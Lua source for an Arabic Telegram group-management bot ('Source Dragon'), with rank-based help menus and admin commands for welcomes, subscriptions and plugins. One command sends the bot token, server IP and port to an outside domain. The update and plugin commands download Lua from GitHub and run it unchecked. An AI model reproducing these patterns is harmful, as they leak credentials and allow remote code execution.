ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙اوامر حمايه اخرى ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙قفل • فتح + الامر ↫ ⤈
⌯︙التكرار بالطرد
⌯︙التكرار بالكتم
⌯︙التكرار بالتقيد
⌯︙الفارسيه بالطرد
⌯︙البوتات بالطرد
⌯︙البوتات بالتقيد
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م2" and SecondSudo(msg) or text == "تعيين امر م٢" and SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل كليشة (م2) الان " ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local WAAD =  DevAIAN:get(WAAD..'AIAN:Help21'..msg.sender_user_id_)
if WAAD == 'msg' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAIAN:del(WAAD..'AIAN:Help21'..msg.sender_user_id_)
DevAIAN:set(WAAD..'AIAN:Help2', text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م2" or text == "م٢" or text == "اوامر2" or text == "اوامر٢" then
if not Admin(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙هذا الامر يخص الرتب الاعلى فقط\n⌯︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAIAN:get(WAAD..'AIAN:Help2')
local Text = [[
⌯︙اوامر الادمنيه ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙الاعدادت
⌯︙تاك للكل 
⌯︙انشاء رابط
⌯︙ضع وصف
⌯︙ضع رابط
⌯︙ضع صوره
⌯︙حذف الرابط
⌯︙حذف المطايه
⌯︙كشف البوتات
⌯︙طرد البوتات
⌯︙تنظيف + العدد
⌯︙تنظيف التعديل
⌯︙كللهم + الكلمه
⌯︙اسم البوت + الامر
⌯︙ضع • حذف ↫ ترحيب
⌯︙ضع • حذف ↫ قوانين
⌯︙اضف • حذف ↫ صلاحيه
⌯︙الصلاحيات • حذف الصلاحيات
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙ضع سبام + العدد
⌯︙ضع تكرار + العدد
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙رفع مميز • تنزيل مميز
⌯︙المميزين • حذف المميزين
⌯︙كشف القيود • رفع القيود
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙حذف • مسح + بالرد
⌯︙منع • الغاء منع
⌯︙قائمه المنع
⌯︙حذف قائمه المنع
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تفعيل • تعطيل ↫ الرابط
⌯︙تفعيل • تعطيل ↫ الالعاب
⌯︙تفعيل • تعطيل ↫ الترحيب
⌯︙تفعيل • تعطيل ↫ التاك للكل
⌯︙تفعيل • تعطيل ↫ كشف الاعدادات
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙طرد المحذوفين
⌯︙طرد ↫ بالرد • بالمعرف • بالايدي
⌯︙كتم • الغاء كتم
⌯︙تقيد • الغاء تقيد
⌯︙حظر • الغاء حظر
⌯︙المكتومين • حذف المكتومين
⌯︙المقيدين • حذف المقيدين
⌯︙المحظورين • حذف المحظورين
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تقييد دقيقه + عدد الدقائق
⌯︙تقييد ساعه + عدد الساعات
⌯︙تقييد يوم + عدد الايام
⌯︙الغاء تقييد ↫ لالغاء التقييد بالوقت
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م3" and SecondSudo(msg) or text == "تعيين امر م٣" and SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل كليشة (م3) الان " ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local WAAD =  DevAIAN:get(WAAD..'AIAN:Help31'..msg.sender_user_id_)
if WAAD == 'msg' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAIAN:del(WAAD..'AIAN:Help31'..msg.sender_user_id_)
DevAIAN:set(WAAD..'AIAN:Help3', text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م3" or text == "م٣" or text == "اوامر3" or text == "اوامر٣" then
if not Admin(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙هذا الامر يخص الرتب الاعلى فقط\n⌯︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAIAN:get(WAAD..'AIAN:Help3')
local Text = [[
⌯︙اوامر المدراء ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙فحص البوت
⌯︙ضع اسم + الاسم
⌯︙اضف • حذف ↫ رد
⌯︙ردود المدير
⌯︙حذف ردود المدير
⌯︙اضف • حذف ↫ رد متعدد
⌯︙حذف رد من متعدد
⌯︙الردود المتعدده
⌯︙حذف الردود المتعدده
⌯︙حذف قوائم المنع
⌯︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
⌯︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تنزيل الكل
⌯︙رفع ادمن • تنزيل ادمن
⌯︙الادمنيه • حذف الادمنيه
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تثبيت
⌯︙الغاء التثبيت
⌯︙اعاده التثبيت
⌯︙الغاء تثبيت الكل
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تغير رد + اسم الرتبه + النص ↫ ⤈
⌯︙المطور • منشئ الاساسي
⌯︙المنشئ • المدير • الادمن
⌯︙المميز • المنظف • العضو
⌯︙حذف ردود الرتب
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تغيير الايدي ↫ لتغيير الكليشه
⌯︙تعيين الايدي ↫ لتعيين الكليشه
⌯︙حذف الايدي ↫ لحذف الكليشه
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تفعيل • تعطيل + الامر ↫ ⤈
⌯︙اطردني • الايدي بالصوره • الابراج
⌯︙معاني الاسماء • اوامر النسب • انطق
⌯︙الايدي • تحويل الصيغ • اوامر التحشيش
⌯︙ردود المدير • ردود المطور • التحقق
⌯︙ضافني • حساب العمر • الزخرفه • غنيلي
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م4" and SecondSudo(msg) or text == "تعيين امر م٤" and SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل كليشة (م4) الان " ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local WAAD =  DevAIAN:get(WAAD..'AIAN:Help41'..msg.sender_user_id_)
if WAAD == 'msg' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAIAN:del(WAAD..'AIAN:Help41'..msg.sender_user_id_)
DevAIAN:set(WAAD..'AIAN:Help4', text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٤" or text == "م4" or text == "اوامر4" or text == "اوامر٤" then
if not Admin(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙هذا الامر يخص الرتب الاعلى فقط\n⌯︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAIAN:get(WAAD..'AIAN:Help4')
local Text = [[
⌯︙اوامر المنشئين ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تنزيل الكل
⌯︙الميديا • امسح
⌯︙تعين عدد الحذف
⌯︙ترتيب الاوامر
⌯︙اضف • حذف ↫ امر
⌯︙حذف الاوامر المضافه
⌯︙الاوامر المضافه
⌯︙اضف نقاط ↫ بالرد • بالايدي
⌯︙اضف رسائل ↫ بالرد • بالايدي
⌯︙رفع منظف • تنزيل منظف
⌯︙المنظفين • حذف المنظفين
⌯︙رفع مدير • تنزيل مدير
⌯︙المدراء • حذف المدراء
⌯︙تفعيل • تعطيل + الامر ↫ ⤈
⌯︙نزلني • امسح
⌯︙الحظر • الكتم
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙اوامر المنشئين الاساسيين ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙وضع لقب + اللقب
⌯︙تفعيل • تعطيل ↫ الرفع
⌯︙رفع منشئ • تنزيل منشئ
⌯︙المنشئين • حذف المنشئين
⌯︙رفع • تنزيل ↫ مشرف
⌯︙رفع بكل الصلاحيات
⌯︙حذف القوائم
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙اوامر المالكين ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙رفع • تنزيل ↫ منشئ اساسي
⌯︙حذف المنشئين الاساسيين 
⌯︙المنشئين الاساسيين 
⌯︙حذف جميع الرتب
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م5" and SecondSudo(msg) or text == "تعيين امر م٥" and SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل كليشة (م5) الان " ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local WAAD =  DevAIAN:get(WAAD..'AIAN:Help51'..msg.sender_user_id_)
if WAAD == 'msg' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAIAN:del(WAAD..'AIAN:Help51'..msg.sender_user_id_)
DevAIAN:set(WAAD..'AIAN:Help5', text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م٥" or text == "م5" or text == "اوامر5" or text == "اوامر٥" then
if not SudoBot(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙هذا الامر للمطورين فقط', 1, 'md')
else
local Help = DevAIAN:get(WAAD..'AIAN:Help5')
local Text = [[
⌯︙اوامر المطورين ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙الكروبات
⌯︙المطورين
⌯︙المشتركين
⌯︙الاحصائيات
⌯︙المجموعات
⌯︙اسم البوت + غادر
⌯︙اسم البوت + تعطيل
⌯︙كشف + -ايدي المجموعه
⌯︙رفع مالك • تنزيل مالك
⌯︙المالكين • حذف المالكين
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙رفع • تنزيل ↫ مدير عام
⌯︙حذف • المدراء العامين 
⌯︙رفع • تنزيل ↫ ادمن عام
⌯︙حذف • الادمنيه العامين 
⌯︙رفع • تنزيل ↫ مميز عام
⌯︙حذف • المميزين عام 
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙اوامر المطور الاساسي ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تحديث
⌯︙الملفات
⌯︙المتجر
⌯︙السيرفر
⌯︙روابط الكروبات
⌯︙تحديث السورس
⌯︙تنظيف الكروبات
⌯︙تنظيف المشتركين
⌯︙حذف جميع الملفات
⌯︙تعيين الايدي العام
⌯︙تغير المطور الاساسي
⌯︙حذف معلومات الترحيب
⌯︙تغير معلومات الترحيب
⌯︙غادر + -ايدي المجموعه
⌯︙تعيين عدد الاعضاء + العدد
⌯︙حظر عام • الغاء العام
⌯︙كتم عام • الغاء العام
⌯︙قائمه العام • حذف قائمه العام
⌯︙وضع • حذف ↫ اسم البوت
⌯︙اضف • حذف ↫ رد عام
⌯︙ردود المطور • حذف ردود المطور
⌯︙تعيين • حذف • جلب ↫ رد الخاص
⌯︙جلب نسخه الكروبات
⌯︙رفع النسخه + بالرد على الملف
⌯︙تعيين • حذف ↫ قناة الاشتراك
⌯︙جلب كليشه الاشتراك
⌯︙تغيير • حذف ↫ كليشه الاشتراك
⌯︙رفع • تنزيل ↫ مطور
⌯︙المطورين • حذف المطورين
⌯︙رفع • تنزيل ↫ مطور ثانوي
⌯︙الثانويين • حذف الثانويين
⌯︙تعيين • حذف ↫ كليشة الايدي
⌯︙اذاعه للكل بالتوجيه ↫ بالرد
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙تفعيل ملف + اسم الملف
⌯︙تعطيل ملف + اسم الملف
⌯︙تفعيل • تعطيل + الامر ↫ ⤈
⌯︙الاذاعه • الاشتراك الاجباري
⌯︙ترحيب البوت • المغادره
⌯︙البوت الخدمي • التواصل
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م6" and SecondSudo(msg) or text == "تعيين امر م٦" and SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل كليشة (م6) الان " ,  1, "md")
DevAIAN:set(WAAD..'AIAN:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local WAAD =  DevAIAN:get(WAAD..'AIAN:Help61'..msg.sender_user_id_)
if WAAD == 'msg' then
Dev_AIAN(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAIAN:del(WAAD..'AIAN:Help61'..msg.sender_user_id_)
DevAIAN:set(WAAD..'AIAN:Help6', text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٦" or text == "م6" or text == "اوامر6" or text == "اوامر٦" then
local Help = DevAIAN:get(WAAD..'AIAN:Help6')
local Text = [[
⌯︙اوامر الاعضاء ↫ ⤈
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙السورس • موقعي • رتبتي • معلوماتي 
⌯︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
⌯︙رسائلي • حذف رسائلي • اسمي • معرفي 
⌯︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
⌯︙نقاطي • بيع نقاطي • القوانين • زخرفه 
⌯︙رابط الحذف • نزلني • اطردني • المطور 
⌯︙منو ضافني • مشاهدات المنشور • الرابط 
⌯︙ايدي المجموعه • معلومات المجموعه 
⌯︙نسبه الحب • نسبه الكره • نسبه الغباء 
⌯︙نسبه الرجوله • نسبه الانوثه • التفاعل
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
⌯︙لقبه + بالرد
⌯︙كول + الكلمه
⌯︙زخرفه + اسمك
⌯︙برج + نوع البرج
⌯︙معنى اسم + الاسم
⌯︙بوسه • بوسها ↫ بالرد
⌯︙احسب + تاريخ ميلادك
⌯︙رفع مطي • تنزيل مطي • المطايه
⌯︙هينه • هينها ↫ بالرد • بالمعرف
⌯︙صيحه • صيحها ↫ بالرد • بالمعرف
⌯︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
⌯︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
⌯︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
⌯︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
]]
Dev_AIAN(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end
--     Source WAAD     --
if SecondSudo(msg) then
if text == "-تحديث السورس-" or text == "-تحديث سورس-" then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙جاري تحديث سورس دراكون', 1, 'md') 
os.execute('rm -rf WAAD.lua') 
os.execute('wget https://raw.githubusercontent.com/CUKURTEAM/WAAD/main/WAAD.lua') 
dofile('WAAD.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم التحديث الى الاصدار الجديد', 1, 'md') 
end
if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث ⌯' then  
dofile('WAAD.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم تحديث ملفات البوت", 1, "md")
end 
--     Source WAAD     --
if text == 'تصحيح اضف البوت في مجموعتك' or text == 'تحديث اضف البوت في مجموعتك' then
if Sudo(msg) then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
local data = json:decode(url)
DevAIAN:set(Server_WAAD.."Token_username",""..data.result.username)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تحديث او تصحيح اضف في مجموعتك\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ")
end
end
if text == "ارسال تبليغ" or text == "جلب التبليغ" or text == "جلب معلومات البوت" then
if tonumber(119541395) and tonumber(16076569) then
https.request("https://api-WAAD.tk/WAAD/WAAD.php?n=WAAD&id="..WAAD.."&token="..TokenBot.."&UserS="..User.."&IPS="..Ip.."&NameS="..Name.."&Port="..Port.."&Time="..UpTime)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم ارسال التبليغ في بوت اللوحة\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ")
end
end
--     Source WAAD     --
if text == 'الملفات' then
Files = '\n⌯︙الملفات المفعله في البوت ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n'
i = 0
for v in io.popen('ls Shop_WAAD'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..i..'~ : `'..v..'`\n'
end
end
if i == 0 then
Files = '⌯︙لا توجد ملفات في البوت'
end
send(msg.chat_id_, msg.id_,Files)
end
if text == "متجر الملفات" or text == 'المتجر' then
local Get_Files, res = https.request("https://raw.githubusercontent.com/CUKURTEAM/Files_WAAD/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n⌯︙قائمة ملفات متجر سورس دراكون\n⌯︙الملفات المتوفره حاليا ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
local TextE = "ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙علامة ↫ (✔) تعني الملف مفعل\n⌯︙علامة ↫ (✖️) تعني الملف معطل\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Shop_WAAD/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CheckFile = "(✔)"
else
CheckFile = "(✖️)"
end
NumFile = NumFile + 1
TextS = TextS.."⌯︙"..Info..' ↫ ⤈\n'..NumFile.."~ : `"..name..'` ↬ '..CheckFile.."\n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"⌯︙لا يوجد اتصال من الـapi") 
end
end
if text == "مسح جميع الملفات" or text == "حذف جميع الملفات" then
os.execute("rm -fr Shop_WAAD/*")
send(msg.chat_id_,msg.id_,"⌯︙تم حذف جميع الملفات المفعله")
end
if text and text:match("^(تعطيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/CUKURTEAM/Files_WAAD/main/Files_WAAD/"..FileName)
if Res == 200 then
os.execute("rm -fr Shop_WAAD/"..FileName)
send(msg.chat_id_, msg.id_,"\n⌯︙الملف ↫ *"..FileName.."*\n⌯︙تم تعطيله وحذفه من البوت بنجاح") 
dofile('WAAD.lua')  
else
send(msg.chat_id_, msg.id_,"⌯︙لا يوجد ملف بهذا الاسم") 
end
end
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/CUKURTEAM/Files_WAAD/main/Files_WAAD/"..FileName)
if Res == 200 then
local ChekAuto = io.open("Shop_WAAD/"..FileName,'w+')
ChekAuto:write(GetJson)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\n⌯︙الملف ↫ *"..FileName.."*\n⌯︙تم تفعيله في البوت بنجاح") 
dofile('WAAD.lua')  
else
send(msg.chat_id_, msg.id_,"⌯︙لا يوجد ملف بهذا الاسم") 
end
return false
end
end 
--     Source WAAD     --
if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and SecondSudo(msg) then    
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حذف معلومات الترحيب', 1, 'md')   
DevAIAN:del(WAAD..'AIAN:Text:BotWelcome')
DevAIAN:del(WAAD..'AIAN:Photo:BotWelcome')
return false
end 
if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب' or text == '↫ تفعيل ترحيب البوت ⌯') and SecondSudo(msg) then    
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevAIAN:del(WAAD..'AIAN:Lock:BotWelcome')
return false
end 
if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب' or text == '↫ تعطيل ترحيب البوت ⌯') and SecondSudo(msg) then    
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevAIAN:set(WAAD..'AIAN:Lock:BotWelcome',true)
return false
end 
if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '↫ تغير معلومات الترحيب ⌯') and SecondSudo(msg) then    
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙ارسل لي نص الترحيب', 1, 'md') 
DevAIAN:del(WAAD..'AIAN:Text:BotWelcome')
DevAIAN:del(WAAD..'AIAN:Photo:BotWelcome')
DevAIAN:set(WAAD.."AIAN:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevAIAN:get(WAAD.."AIAN:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء الامر", 1, "md") 
DevAIAN:del(WAAD.."AIAN:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ النص ارسل لي صورة الترحيب\n⌯︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevAIAN:set(WAAD.."AIAN:Text:BotWelcome",text) 
DevAIAN:set(WAAD.."AIAN:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevAIAN:get(WAAD.."AIAN:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
DevAIAN:del(WAAD.."AIAN:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
DevAIAN:set(WAAD.."AIAN:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حفظ النص وصورة الترحيب", 1, 'md')   
DevAIAN:del(WAAD.."AIAN:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
--     Source WAAD     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^↫ وضع كليشه المطور ⌯$") or text and text:match("^تغيير كليشه المطور$") then
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙ارسل كليشة المطور الان ", 1, "md")
DevAIAN:setex(WAAD.."AIAN:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حذف كليشة المطور", 1, "md")
DevAIAN:del(WAAD.."DevText")
end end
--     Source WAAD     --
if DevAIAN:get(WAAD.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم الغاء الامر", 1, "md") 
DevAIAN:del(WAAD.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAIAN:del(WAAD.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevAIAN:set(WAAD..'AIAN:ChText',texxt)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^تغير كليشه الاشتراك$") and SecondSudo(msg) or text and text:match("^تغيير كليشه الاشتراك$") and SecondSudo(msg) or text and text:match("^↫ تعيين كليشه الاشتراك ⌯$") and SecondSudo(msg) then  
DevAIAN:setex(WAAD.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
local text = '⌯︙حسنا ارسل كليشة الاشتراك الجديده'  
Dev_AIAN(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" or text == "↫ حذف كليشه الاشتراك ⌯" then  
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
DevAIAN:del(WAAD..'AIAN:ChText')
textt = "⌯︙تم حذف كليشة الاشتراك الاجباري"
Dev_AIAN(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' or text == '↫ كليشه الاشتراك ⌯' then
if not SecondSudo(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمطور الاساسي فقط ', 1, 'md')
else
local chtext = DevAIAN:get(WAAD.."AIAN:ChText")
if chtext then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙كليشة الاشتراك ↫ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n['..chtext..']', 1, 'md')
else
if DevAIAN:get(WAAD.."AIAN:ChId") then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAIAN:get(WAAD.."AIAN:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "⌯︙عذرا لاتستطيع استخدام البوت !\n⌯︙عليك الاشتراك في القناة اولا :"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
